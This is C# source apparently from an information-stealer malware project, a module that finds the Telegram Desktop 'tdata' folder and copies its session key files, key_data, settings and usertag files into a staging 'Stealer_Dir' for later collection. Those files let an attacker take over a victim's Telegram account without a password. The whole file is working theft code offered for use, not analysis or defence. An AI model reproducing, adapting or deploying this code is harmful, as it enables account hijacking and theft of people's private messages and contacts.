using System;
using System.Diagnostics;
using System.IO;

namespace youknowcaliber
{
    class Telegram
    {
        // Copy directory
        public static void CopyDirectory(string sourceFolder, string destFolder)
        {
            if (!Directory.Exists(destFolder))
                Directory.CreateDirectory(destFolder);
            string[] files = Directory.GetFiles(sourceFolder);
            foreach (string file in files)
            {
                string name = Path.GetFileName(file);
                string dest = Path.Combine(destFolder, name);
                File.Copy(file, dest);
            }
            string[] folders = Directory.GetDirectories(sourceFolder);
            foreach (string folder in folders)
            {
                string name = Path.GetFileName(folder);
                string dest = Path.Combine(destFolder, name);
                Filemanager.CopyDirectory(folder, dest);
            }
        }
        // Get tdata directory
        private static string GetTdata()
        {
            string TelegramDesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop\\tdata";
            Process[] TelegramProcesses = Process.GetProcessesByName("Telegram");

            if (TelegramProcesses.Length == 0)
                return TelegramDesktopPath;
            else
                return Path.Combine(
                    Path.GetDirectoryName(
                        ProcessList.ProcessExecutablePath(
                            TelegramProcesses[0])), "tdata");
        }

        public static void GetTelegramSessions()
        {
            string Stealer_Dir = Help.ExploitDir;
            string TelegramDesktopPath = GetTdata();
            try
            {
                if (!Directory.Exists(TelegramDesktopPath))
                    return;
                Stealer_Dir = Stealer_Dir + "\\Telegram";
                Directory.CreateDirectory(Stealer_Dir);

                // Get all directories
                string[] Directories = Directory.GetDirectories(TelegramDesktopPath);
                string[] Files = Directory.GetFiles(TelegramDesktopPath);

                // Copy directories
                foreach (string dir in Directories)
                {
                    string name = new DirectoryInfo(dir).Name;
                    if (name.Length == 16)
                    {
                        string copyTo = Path.Combine(Stealer_Dir, name);
                        CopyDirectory(dir, copyTo);
                    }
                }
                // Copy files
                foreach (string file in Files)
                {
                    FileInfo finfo = new FileInfo(file);
                    string name = finfo.Name;
                    string copyTo = Path.Combine(Stealer_Dir, name);
                    // Check file size
                    if (finfo.Length > 5120)
                        continue;
                    // Copy session files
                    if (name.EndsWith("s") && name.Length == 17)
                    {
                        finfo.CopyTo(copyTo);
                        continue;
                    }
                    // Copy required files
                    if (name.StartsWith("usertag") || name.StartsWith("settings") || name.StartsWith("key_data"))
                        finfo.CopyTo(copyTo);
                    Counting.Telegram++;
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }
    }
}
